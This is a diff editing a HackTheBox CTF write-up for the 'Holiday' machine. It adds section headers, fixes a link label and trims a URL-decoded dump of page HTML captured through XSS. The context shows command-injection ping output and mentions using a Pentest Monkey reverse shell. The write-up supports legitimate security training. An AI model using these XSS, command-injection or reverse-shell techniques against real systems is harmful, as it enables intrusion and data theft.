@@ -27,7 +27,7 @@ Holiday is one of the most difficult machines currently on HackTheBox. The XSS k
 | Details |  |
 | --- | --- |
 | Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
-| Link To Machine | [HTB - 001 - Hard - Holiday](https://www.hackthebox.eu/home/machines/profile/22) |
+| Link To Machine | [HTB - 0022- Hard - Holiday](https://www.hackthebox.eu/home/machines/profile/22) |
 | Machine Release Date | 2nd June 2017 |
 | Date I Completed It | 18th June 2020 |
 | Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/news/kali-linux-2020-1-release/) |
@@ -169,6 +169,8 @@ http://10.10.10.25:8000/LOGIN (Status: 200)
 2020/06/13 12:35:33 Finished
 ===============================================================
 ```
+
+## Gaining Access
 
 Mystery solved, now to look at what I've found and /login sounds interesting so start with that:
 
@@ -569,9 +571,7 @@ In [2]: urllib.parse.unquote("""cookie=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D
    ...: ntent%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%20%20%3Ctitle%3EBooking%20Management%3C%2Ftitle%3E%0A%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D
    ...: 1.0%22%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3D%22%2Fcss%2Fbootstrap.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3
    ...: D%22%2Fcss%2Fmain.min.css%22%20%2F%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fjs%2Fbootstrap.min.js%22%3E%3C%2Fscript%3E%0A%20%20%3C%2Fhead
-   ...: %3E%0A%0A%20%20%3Cbody%3E%0A%20%20%20%20%20%20%3Cdiv%20id%3D%22st-container%22%20class%3D%22st-container%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22st-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%2
-   ...: 0%20%20%20%20%20%20%20%20%3Cnav%20class%3D%22navbar%20navbar-inverse%20navbar-static-top%20hidden-print%22%20role%3D%22navigation%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E
-   ...: %0A%20%20%20%20%20%20%20%20%20%20
+   ...:
 <SNIP>
 ```
 
@@ -637,6 +637,8 @@ PING 0x0a0a0e23 (10.10.14.35) 56(84) bytes of data.
 64 bytes from 10.10.14.35: icmp_seq=2 ttl=64 time=0.024 ms
 64 bytes from 10.10.14.35: icmp_seq=3 ttl=64 time=0.023 ms
 ```
+
+## User Flag
 
 Works, so now we need a shell, use one from Pentest Monkey:
 
